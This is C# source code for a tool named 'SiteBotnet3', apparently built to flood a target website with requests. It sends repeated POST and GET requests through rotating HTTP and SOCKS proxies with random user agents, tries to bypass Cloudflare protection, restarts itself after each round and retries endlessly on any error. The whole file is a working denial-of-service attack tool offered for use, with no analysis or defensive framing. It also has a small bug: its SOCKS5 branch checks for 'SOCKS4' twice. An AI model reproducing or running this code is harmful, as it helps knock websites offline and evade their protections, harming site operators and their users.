using System;
using System.Collections.Generic;
using Leaf.xNet;
using Leaf.xNet.Services.Cloudflare;
using System.Net.NetworkInformation;
using System.Threading;

namespace SiteBotnet3
{
    class Requests
    {
        private string ProxyType;
        private List<string> ProxyList;

        private string Target;
        private int Threads;

        private int Hits;

        private Thread Thread;
        private string ThreadName;

        public Requests(string Name) { ThreadName = Name; }

        public void SetTarget(string Target) { this.Target = Target; }

        public void SetThreads(int Threads) { this.Threads = Threads; }

        public void SetProxyType(string ProxyType) { this.ProxyType = ProxyType; }

        public void SetProxyList(List<string> ProxyList) { if (!ProxyType.Equals("NONE")) this.ProxyList = ProxyList; }

        public void Start(bool showMsg)
        {
            if (showMsg) Console.WriteLine(ThreadName + " IS STARTING...");
            Thread = new Thread(BotnetWebsite) { Name = ThreadName };
            Thread.Start();
        }

        private void BotnetWebsite()
        {
            request: try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.UserAgent = Http.RandomUserAgent();
                    req.IgnoreProtocolErrors = true;
                    req.Cookies = new CookieStorage();
                    req.KeepAlive = true;

                    if (ProxyType == "HTTP")
                    {
                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                        req.Proxy = HttpProxyClient.Parse(proxy);
                        Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
                    }
                    else if (ProxyType == "SOCKS4")
                    {
                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                        req.Proxy = Socks4ProxyClient.Parse(proxy);
                        Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
                    }
                    else if (ProxyType == "SOCKS4")
                    {
                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                        req.Proxy = Socks5ProxyClient.Parse(proxy);
                        Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
                    }
                    else if (ProxyType == "NONE")
                    {
                        req.Proxy = null;
                        req.KeepAlive = true;
                    }
                    Thread.Sleep(100);

                    HttpResponse respo = req.Post(Target);
                    if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(Target);

                    using (HttpRequest req1 = new HttpRequest())
                    {
                        req1.UserAgent = Http.RandomUserAgent();
                        req1.IgnoreProtocolErrors = true;
                        req1.Cookies = new CookieStorage();

                        if (ProxyType == "HTTP")
                        {
                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                            req1.Proxy = new HttpProxyClient(proxy);
                            Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
                        }
                        else if (ProxyType == "SOCKS4")
                        {
                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                            req1.Proxy = new Socks4ProxyClient(proxy);
                            Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
                        }
                        else if (ProxyType == "SOCKS4")
                        {
                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                            req1.Proxy = new Socks5ProxyClient(proxy);
                            Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
                        }
                        else if (ProxyType == "NONE")
                        {
                            req1.Proxy = null;
                            req1.KeepAlive = true;
                        }
                        Thread.Sleep(100);

                        HttpResponse respo1 = req1.Get(Target);
                        if (respo1.IsCloudflared()) respo1 = req1.GetThroughCloudflare(Target);

                        Hits += 1;
                        Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Target : " + Target + " | Threads : " + Threads);
                        new Ping().Send(new Uri(Target).Host);

                        Start(false);
                    }
                }
            }
            catch { goto request; }
        }
    }
}
